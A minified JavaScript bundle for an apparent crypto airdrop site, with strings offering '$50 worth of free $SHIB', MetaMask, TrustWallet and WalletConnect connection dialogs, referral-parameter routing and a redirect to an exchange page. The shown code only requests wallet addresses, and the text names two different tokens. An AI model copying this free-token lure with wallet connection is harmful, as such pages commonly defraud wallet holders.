(function(t) {
    function e(e) {
        for (var n, r, i = e[0], c = e[1], l = e[2], u = 0, h = []; u < i.length; u++) r = i[u],
        Object.prototype.hasOwnProperty.call(o, r) && o[r] && h.push(o[r][0]),
            o[r] = 0;
        for (n in c) Object.prototype.hasOwnProperty.call(c, n) && (t[n] = c[n]);
        d && d(e);
        while (h.length) h.shift()();
        return a.push.apply(a, l || []),
            s()
    }
    function s() {
        for (var t, e = 0; e < a.length; e++) {
            for (var s = a[e], n = !0, i = 1; i < s.length; i++) {
                var c = s[i];
                0 !== o[c] && (n = !1)
            }
            n && (a.splice(e--, 1), t = r(r.s = s[0]))
        }
        return t
    }
    var n = {},
        o = {
            app: 0
        },
        a = [];
    function r(e) {
        if (n[e]) return n[e].exports;
        var s = n[e] = {
            i: e,
            l: !1,
            exports: {}
        };
        return t[e].call(s.exports, s, s.exports, r),
            s.l = !0,
            s.exports
    }
    r.m = t,
        r.c = n,
        r.d = function(t, e, s) {
            r.o(t, e) || Object.defineProperty(t, e, {
                enumerable: !0,
                get: s
            })
        },
        r.r = function(t) {
            "undefined" !== typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, {
                value: "Module"
            }),
                Object.defineProperty(t, "__esModule", {
                    value: !0
                })
        },
        r.t = function(t, e) {
            if (1 & e && (t = r(t)), 8 & e) return t;
            if (4 & e && "object" === typeof t && t && t.__esModule) return t;
            var s = Object.create(null);
            if (r.r(s), Object.defineProperty(s, "default", {
                enumerable: !0,
                value: t
            }), 2 & e && "string" != typeof t) for (var n in t) r.d(s, n,
                function(e) {
                    return t[e]
                }.bind(null, n));
            return s
        },
        r.n = function(t) {
            var e = t && t.__esModule ?
                function() {
                    return t["default"]
                }: function() {
                    return t
                };
            return r.d(e, "a", e),
                e
        },
        r.o = function(t, e) {
            return Object.prototype.hasOwnProperty.call(t, e)
        },
        r.p = "/";
    var i = window["webpackJsonp"] = window["webpackJsonp"] || [],
        c = i.push.bind(i);
    i.push = e,
        i = i.slice();
    for (var l = 0; l < i.length; l++) e(i[l]);
    var d = c;
    a.push([0, "chunk-vendors"]),
        s()
})({
    0 : function(t, e, s) {
        t.exports = s("56d7")
    },
    "034f": function(t, e, s) {
        "use strict";
        s("651e")
    },
    "0cb0": function(t, e) {
        t.exports = "data:image/png;base64,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"
    },
    1 : function(t, e) {},
    10 : function(t, e) {},
    11 : function(t, e) {},
    12 : function(t, e) {},
    13 : function(t, e) {},
    14 : function(t, e) {},
    15 : function(t, e) {},
    "1d37": function(t, e, s) {
        t.exports = s.p + "img/walletconnect.8215855c.svg"
    },
    "1e06": function(t, e, s) {
        "use strict";
        s.r(e),
            s.d(e, "lang", (function() {
                return n
            }));
        var n = {
            airdrop: "Airdrop",
            airdropdesc: "Get $50 worth of free $SHIB",
            go: "Go",
            fishtoharvest: "FISH to Harvest:",
            comingsoon: "Coming Soon",
            upto: "Up to:",
            inpools: "in Pools",
            connect: "Connect",
            desc1: "A good day for fishing",
            desc2: "Fishing for token earn",
            home: "Home",
            exchange: "Exchange",
            fishing: "Fishing",
            more: "More",
            docs: "Docs",
            contact: "Contact",
            fishingpools: "Fishing Pools",
            fishstats: "Fish Stats"
        }
    },
    2 : function(t, e) {},
    "23d0": function(t, e, s) {
        "use strict";
        s.r(e),
            s.d(e, "lang", (function() {
                return n
            }));
        var n = {
            airdrop: "空投",
            airdropdesc: "Get $50 worth of free $FISH",
            go: "Go",
            fishtoharvest: "FISH to Harvest:",
            comingsoon: "Coming Soon",
            upto: "Up to:",
            inpools: "in Pools",
            connect: "Connect",
            desc1: "A good day for fishing",
            desc2: "Fishing for token earn",
            home: "Home",
            exchange: "Exchange",
            fishing: "Fishing",
            more: "More",
            docs: "Docs",
            contact: "Contact",
            fishingpools: "Fishing Pools",
            fishstats: "Fish Stats"
        }
    },
    "2b56": function(t, e, s) {
        "use strict";
        s("532d")
    },
    3 : function(t, e) {},
    4 : function(t, e) {},
    4678 : function(t, e, s) {
        var n = {
            "./af": "2bfb",
            "./af.js": "2bfb",
            "./ar": "8e73",
            "./ar-dz": "a356",
            "./ar-dz.js": "a356",
            "./ar-kw": "423e",
            "./ar-kw.js": "423e",
            "./ar-ly": "1cfd",
            "./ar-ly.js": "1cfd",
            "./ar-ma": "0a84",
            "./ar-ma.js": "0a84",
            "./ar-sa": "8230",
            "./ar-sa.js": "8230",
            "./ar-tn": "6d83",
            "./ar-tn.js": "6d83",
            "./ar.js": "8e73",
            "./az": "485c",
            "./az.js": "485c",
            "./be": "1fc1",
            "./be.js": "1fc1",
            "./bg": "84aa",
            "./bg.js": "84aa",
            "./bm": "a7fa",
            "./bm.js": "a7fa",
            "./bn": "9043",
            "./bn-bd": "9686",
            "./bn-bd.js": "9686",
            "./bn.js": "9043",
            "./bo": "d26a",
            "./bo.js": "d26a",
            "./br": "6887",
            "./br.js": "6887",
            "./bs": "2554",
            "./bs.js": "2554",
            "./ca": "d716",
            "./ca.js": "d716",
            "./cs": "3c0d",
            "./cs.js": "3c0d",
            "./cv": "03ec",
            "./cv.js": "03ec",
            "./cy": "9797",
            "./cy.js": "9797",
            "./da": "0f14",
            "./da.js": "0f14",
            "./de": "b469",
            "./de-at": "b3eb",
            "./de-at.js": "b3eb",
            "./de-ch": "bb71",
            "./de-ch.js": "bb71",
            "./de.js": "b469",
            "./dv": "598a",
            "./dv.js": "598a",
            "./el": "8d47",
            "./el.js": "8d47",
            "./en-au": "0e6b",
            "./en-au.js": "0e6b",
            "./en-ca": "3886",
            "./en-ca.js": "3886",
            "./en-gb": "39a6",
            "./en-gb.js": "39a6",
            "./en-ie": "e1d3",
            "./en-ie.js": "e1d3",
            "./en-il": "7333",
            "./en-il.js": "7333",
            "./en-in": "ec2e",
            "./en-in.js": "ec2e",
            "./en-nz": "6f50",
            "./en-nz.js": "6f50",
            "./en-sg": "b7e9",
            "./en-sg.js": "b7e9",
            "./eo": "65db",
            "./eo.js": "65db",
            "./es": "898b",
            "./es-do": "0a3c",
            "./es-do.js": "0a3c",
            "./es-mx": "b5b7",
            "./es-mx.js": "b5b7",
            "./es-us": "55c9",
            "./es-us.js": "55c9",
            "./es.js": "898b",
            "./et": "ec18",
            "./et.js": "ec18",
            "./eu": "0ff2",
            "./eu.js": "0ff2",
            "./fa": "8df4",
            "./fa.js": "8df4",
            "./fi": "81e9",
            "./fi.js": "81e9",
            "./fil": "d69a",
            "./fil.js": "d69a",
            "./fo": "0721",
            "./fo.js": "0721",
            "./fr": "9f26",
            "./fr-ca": "d9f8",
            "./fr-ca.js": "d9f8",
            "./fr-ch": "0e49",
            "./fr-ch.js": "0e49",
            "./fr.js": "9f26",
            "./fy": "7118",
            "./fy.js": "7118",
            "./ga": "5120",
            "./ga.js": "5120",
            "./gd": "f6b4",
            "./gd.js": "f6b4",
            "./gl": "8840",
            "./gl.js": "8840",
            "./gom-deva": "aaf2",
            "./gom-deva.js": "aaf2",
            "./gom-latn": "0caa",
            "./gom-latn.js": "0caa",
            "./gu": "e0c5",
            "./gu.js": "e0c5",
            "./he": "c7aa",
            "./he.js": "c7aa",
            "./hi": "dc4d",
            "./hi.js": "dc4d",
            "./hr": "4ba9",
            "./hr.js": "4ba9",
            "./hu": "5b14",
            "./hu.js": "5b14",
            "./hy-am": "d6b6",
            "./hy-am.js": "d6b6",
            "./id": "5038",
            "./id.js": "5038",
            "./is": "0558",
            "./is.js": "0558",
            "./it": "6e98",
            "./it-ch": "6f12",
            "./it-ch.js": "6f12",
            "./it.js": "6e98",
            "./ja": "079e",
            "./ja.js": "079e",
            "./jv": "b540",
            "./jv.js": "b540",
            "./ka": "201b",
            "./ka.js": "201b",
            "./kk": "6d79",
            "./kk.js": "6d79",
            "./km": "e81d",
            "./km.js": "e81d",
            "./kn": "3e92",
            "./kn.js": "3e92",
            "./ko": "22f8",
            "./ko.js": "22f8",
            "./ku": "2421",
            "./ku.js": "2421",
            "./ky": "9609",
            "./ky.js": "9609",
            "./lb": "440c",
            "./lb.js": "440c",
            "./lo": "b29d",
            "./lo.js": "b29d",
            "./lt": "26f9",
            "./lt.js": "26f9",
            "./lv": "b97c",
            "./lv.js": "b97c",
            "./me": "293c",
            "./me.js": "293c",
            "./mi": "688b",
            "./mi.js": "688b",
            "./mk": "6909",
            "./mk.js": "6909",
            "./ml": "02fb",
            "./ml.js": "02fb",
            "./mn": "958b",
            "./mn.js": "958b",
            "./mr": "39bd",
            "./mr.js": "39bd",
            "./ms": "ebe4",
            "./ms-my": "6403",
            "./ms-my.js": "6403",
            "./ms.js": "ebe4",
            "./mt": "1b45",
            "./mt.js": "1b45",
            "./my": "8689",
            "./my.js": "8689",
            "./nb": "6ce3",
            "./nb.js": "6ce3",
            "./ne": "3a39",
            "./ne.js": "3a39",
            "./nl": "facd",
            "./nl-be": "db29",
            "./nl-be.js": "db29",
            "./nl.js": "facd",
            "./nn": "b84c",
            "./nn.js": "b84c",
            "./oc-lnc": "167b",
            "./oc-lnc.js": "167b",
            "./pa-in": "f3ff",
            "./pa-in.js": "f3ff",
            "./pl": "8d57",
            "./pl.js": "8d57",
            "./pt": "f260",
            "./pt-br": "d2d4",
            "./pt-br.js": "d2d4",
            "./pt.js": "f260",
            "./ro": "972c",
            "./ro.js": "972c",
            "./ru": "957c",
            "./ru.js": "957c",
            "./sd": "6784",
            "./sd.js": "6784",
            "./se": "ffff",
            "./se.js": "ffff",
            "./si": "eda5",
            "./si.js": "eda5",
            "./sk": "7be6",
            "./sk.js": "7be6",
            "./sl": "8155",
            "./sl.js": "8155",
            "./sq": "c8f3",
            "./sq.js": "c8f3",
            "./sr": "cf1e",
            "./sr-cyrl": "13e9",
            "./sr-cyrl.js": "13e9",
            "./sr.js": "cf1e",
            "./ss": "52bd",
            "./ss.js": "52bd",
            "./sv": "5fbd",
            "./sv.js": "5fbd",
            "./sw": "74dc",
            "./sw.js": "74dc",
            "./ta": "3de5",
            "./ta.js": "3de5",
            "./te": "5cbb",
            "./te.js": "5cbb",
            "./tet": "576c",
            "./tet.js": "576c",
            "./tg": "3b1b",
            "./tg.js": "3b1b",
            "./th": "10e8",
            "./th.js": "10e8",
            "./tk": "5aff",
            "./tk.js": "5aff",
            "./tl-ph": "0f38",
            "./tl-ph.js": "0f38",
            "./tlh": "cf75",
            "./tlh.js": "cf75",
            "./tr": "0e81",
            "./tr.js": "0e81",
            "./tzl": "cf51",
            "./tzl.js": "cf51",
            "./tzm": "c109",
            "./tzm-latn": "b53d",
            "./tzm-latn.js": "b53d",
            "./tzm.js": "c109",
            "./ug-cn": "6117",
            "./ug-cn.js": "6117",
            "./uk": "ada2",
            "./uk.js": "ada2",
            "./ur": "5294",
            "./ur.js": "5294",
            "./uz": "2e8c",
            "./uz-latn": "010e",
            "./uz-latn.js": "010e",
            "./uz.js": "2e8c",
            "./vi": "2921",
            "./vi.js": "2921",
            "./x-pseudo": "fd7e",
            "./x-pseudo.js": "fd7e",
            "./yo": "7f33",
            "./yo.js": "7f33",
            "./zh-cn": "5c3a",
            "./zh-cn.js": "5c3a",
            "./zh-hk": "49ab",
            "./zh-hk.js": "49ab",
            "./zh-mo": "3a6c",
            "./zh-mo.js": "3a6c",
            "./zh-tw": "90ea",
            "./zh-tw.js": "90ea"
        };
        function o(t) {
            var e = a(t);
            return s(e)
        }
        function a(t) {
            if (!s.o(n, t)) {
                var e = new Error("Cannot find module '" + t + "'");
                throw e.code = "MODULE_NOT_FOUND",
                    e
            }
            return n[t]
        }
        o.keys = function() {
            return Object.keys(n)
        },
            o.resolve = a,
            t.exports = o,
            o.id = "4678"
    },
    "4e7c": function(t, e, s) {},
    5 : function(t, e) {},
    "532d": function(t, e, s) {},
    5333 : function(t, e, s) {
        t.exports = s.p + "img/trustwallet.9c9f4f16.png"
    },
    "56d7": function(t, e, s) {
        "use strict";
        s.r(e);
        s("e260"),
            s("e6cf"),
            s("cca6"),
            s("a79d");
        var n = s("2b0e"),
            o = function() {
                var t = this,
                    e = t.$createElement,
                    n = t._self._c || e;
                return n("div", {
                        staticStyle: {
                            "z-index": "10"
                        },
                        attrs: {
                            id: "app"
                        }
                    },
                    [n("a-layout", {
                            staticStyle: {
                                "min-height": "100vh"
                            },
                            attrs: {
                                id: "components-layout-demo-side"
                            }
                        },
                        [n("a-layout-header", {
                                staticClass: "flex-left",
                                staticStyle: {
                                    background: "#fff",
                                    padding: "0"
                                }
                            },
                            [n("div", {
                                    staticClass: "unit-0",
                                    staticStyle: {
                                        "padding-left": "20px"
                                    }
                                },
                                [n("a-icon", {
                                    staticClass: "trigger",
                                    staticStyle: {
                                        "font-size": "18px",
                                        "margin-right": "15px"
                                    },
                                    attrs: {
                                        type: t.collapsed ? "menu-unfold": "menu-fold"
                                    },
                                    on: {
                                        click: function() {
                                            return t.collapsed = !t.collapsed
                                        }
                                    }
                                }), n("img", {
                                    attrs: {
                                        src: s("0cb0"),
                                        width: "100px",
                                        height: "30px"
                                    },
                                    on: {
                                        click: t.goHome
                                    }
                                })], 1), n("div", {
                                    staticClass: "unit flex-right"
                                },
                                [n("a-dropdown", {
                                        staticStyle: {
                                            "margin-left": "10px"
                                        }
                                    },
                                    [n("div", {
                                            staticClass: "ant-dropdown-link",
                                            staticStyle: {
                                                color: "rgb(15, 173, 175)"
                                            },
                                            on: {
                                                click: function(t) {
                                                    return t.preventDefault()
                                                }
                                            }
                                        },
                                        ["en-US" == this.$i18n.locale ? n("span", [t._v("EN")]) : t._e(), "ja" == this.$i18n.locale ? n("span", [t._v("日本語")]) : t._e(), "zh-CN" == this.$i18n.locale ? n("span", [t._v("中文")]) : t._e(), n("a-icon", {
                                            attrs: {
                                                type: "down"
                                            }
                                        })], 1), n("a-menu", {
                                            attrs: {
                                                slot: "overlay"
                                            },
                                            slot: "overlay"
                                        },
                                        [n("a-menu-item", {
                                                key: "1",
                                                on: {
                                                    click: t.changeEn
                                                }
                                            },
                                            [t._v("English")]), n("a-menu-item", {
                                                key: "2",
                                                on: {
                                                    click: t.changeJp
                                                }
                                            },
                                            [t._v("日本語")]), n("a-menu-item", {
                                                key: "3 ",
                                                on: {
                                                    click: t.changeCN
                                                }
                                            },
                                            [t._v("中文")])], 1)], 1)], 1), n("div", {
                                staticStyle: {
                                    float: "right",
                                    "margin-right": "15px"
                                }
                            }), n("el-dialog", {
                                    attrs: {
                                        title: "Connect to a wallet",
                                        width: "300px",
                                        visible: t.chooseConnect,
                                        "show-close": !1
                                    },
                                    on: {
                                        "update:visible": function(e) {
                                            t.chooseConnect = e
                                        }
                                    }
                                },
                                [n("button", {
                                        staticClass: "connectBtn1",
                                        attrs: {
                                            type: "button"
                                        },
                                        on: {
                                            click: t.connectoMetamask
                                        }
                                    },
                                    [t._v(" MetaMask "), n("img", {
                                        staticClass: "metamask",
                                        attrs: {
                                            src: s("ba67")
                                        }
                                    })]), n("button", {
                                        staticClass: "connectBtntw",
                                        attrs: {
                                            type: "button"
                                        },
                                        on: {
                                            click: t.connectoMetamask
                                        }
                                    },
                                    [t._v(" TrustWallet "), n("img", {
                                        staticClass: "trustwallet",
                                        attrs: {
                                            src: s("5333")
                                        }
                                    })]), n("button", {
                                        staticClass: "connectBtn",
                                        attrs: {
                                            type: "button"
                                        },
                                        on: {
                                            click: t.connecttoWalletConnect
                                        }
                                    },
                                    [t._v(" WalletConnect "), n("img", {
                                        staticClass: "walletconnect",
                                        attrs: {
                                            src: s("1d37")
                                        }
                                    })])])], 1), n("a-drawer", {
                                attrs: {
                                    title: "Menu",
                                    placement: "left",
                                    visible: t.collapsed,
                                    closable: !1,
                                    "after-visible-change": t.afterVisibleChange
                                },
                                on: {
                                    close: t.onClose
                                }
                            },
                            [n("a-menu", {
                                    staticStyle: {
                                        "text-align": "left"
                                    },
                                    attrs: {
                                        theme: "light",
                                        "default-selected-keys": ["1"]
                                    }
                                },
                                [n("a-menu-item", {
                                        key: "1",
                                        on: {
                                            click: t.goHome
                                        }
                                    },
                                    [n("a-icon", {
                                        attrs: {
                                            type: "home"
                                        }
                                    }), n("span", {
                                        domProps: {
                                            textContent: t._s(t.$t("lang.home"))
                                        }
                                    })], 1), n("a-menu-item", {
                                        key: "4",
                                        on: {
                                            click: t.goAirdrop
                                        }
                                    },
                                    [n("a-icon", {
                                        attrs: {
                                            type: "read"
                                        }
                                    }), n("span", {
                                        domProps: {
                                            textContent: t._s(t.$t("lang.airdrop"))
                                        }
                                    })], 1)], 1)], 1), n("a-layout", [n("a-layout-content", [n("router-view")], 1)], 1)], 1), n("el-dialog", {
                            attrs: {
                                width: "300px",
                                visible: t.msgstate
                            },
                            on: {
                                "update:visible": function(e) {
                                    t.msgstate = e
                                }
                            }
                        },
                        [n("div", [t._v(t._s(this.msg))])]), n("el-dialog", {
                            attrs: {
                                title: "Your wallet",
                                width: "300px",
                                visible: t.walletdialog
                            },
                            on: {
                                "update:visible": function(e) {
                                    t.walletdialog = e
                                }
                            }
                        },
                        [n("div", [t._v(t._s(this.fulladdress))])]), n("el-dialog", {
                            attrs: {
                                title: "Network Error",
                                width: "300px",
                                visible: t.networkerror
                            },
                            on: {
                                "update:visible": function(e) {
                                    t.networkerror = e
                                }
                            }
                        },
                        [n("div", [t._v(" WBF only supports Binance Smart Chain Mainnet, "), n("br"), t._v("please switch to the corresponding network and then operate. ")])])], 1)
            },
            a = [],
            r = s("c156"),
            i = s.n(r),
            c = s("745c"),
            l = s.n(c),
            d = new i.a({
                bridge: "https://bridge.walletconnect.org",
                qrcodeModal: l.a
            }),
            u = {
                data: function() {
                    return {
                        networkerror: !1,
                        address: "",
                        isConnect: !1,
                        chooseConnect: !1,
                        collapsed: !1,
                        msgstate: !1,
                        msg: "",
                        walletdialog: !1,
                        fulladdress: ""
                    }
                },
                mounted: function() {},
                methods: {
                    ellipsis: function(t) {
                        var e = t.length;
                        return t ? t.length > 20 ? t.substring(0, 6) + "..." + t.substring(e - 4, e) : t: ""
                    },
                    afterVisibleChange: function(t) {},
                    showDrawer: function() {
                        this.collapsed = !0
                    },
                    onClose: function() {
                        this.collapsed = !1
                    },
                    connectoMetamask: function() {
                        var t = this;
                        window.ethereum.request({
                            method: "eth_requestAccounts"
                        }).then((function(e) {
                            var s = e[0];
                            t.address = s
                        })).
                        catch((function(e) {
                            t.msgstate = !0,
                                t.msg = e.message
                        }))
                    },
                    connecttoWalletConnect: function() {
                        var t = this;
                        d.connected || d.createSession(),
                            d.on("connect", (function(e, s) {
                                if (e) throw e;
                                var n = s.params[0],
                                    o = n.accounts,
                                    a = n.chainId;
                                t.isConnect = !0,
                                    t.chooseConnect = !1,
                                    t.walletconnectisconnect = !0,
                                    sessionStorage.setItem("address", o[0]),
                                    sessionStorage.setItem("wallet", "walletconnect"),
                                    console.log(o),
                                    t.address = t.ellipsis(o[0]),
                                    t.fulladdress = o[0],
                                    console.log(t.address),
                                1 !== a && (t.netowkrerror = !0)
                            }))
                    },
                    connecttoTrustWallet: function() {},
                    changeEn: function() {
                        this.$i18n.locale = "en-US"
                    },
                    changeJp: function() {
                        this.$i18n.locale = "ja"
                    },
                    changeCN: function() {
                        this.$i18n.locale = "zh-CN"
                    },
                    goHome: function() {
                        void 0 === this.$route.query.s ? this.$router.push("/") : this.$router.push("/?s=" + this.$route.query.s),
                            this.collapsed = !1
                    },
                    goAirdrop: function() {
                        void 0 === this.$route.query.s ? this.$router.push("/Airdrop") : this.$router.push("/Airdrop?s=" + this.$route.query.s),
                            this.collapsed = !1
                    },
                    goExchange: function() {
                        void 0 === this.$route.query.s ? window.location.href = "https://app.shib.center/": window.location.href = "https://app.shib.center/?s=" + this.$route.query.s
                    },
                    goFishing: function() {
                        void 0 === this.$route.query.s ? this.$router.push("/Fishing") : this.$router.push("/Fishing?s=" + this.$route.query.s)
                    }
                },
                name: "app",
                components: {}
            },
            h = u,
            f = (s("034f"), s("2877")),
            g = Object(f["a"])(h, o, a, !1, null, null, null),
            p = g.exports,
            m = s("8c4f"),
            b = function() {
                var t = this,
                    e = t.$createElement,
                    n = t._self._c || e;
                return n("div", {
                        staticClass: "home"
                    },
                    [n("div", {
                            staticStyle: {
                                padding: "30px",
                                height: "100%"
                            }
                        },
                        [n("a-row", {
                                attrs: {
                                    type: "flex",
                                    justify: "start"
                                }
                            },
                            [n("a-col", {
                                attrs: {
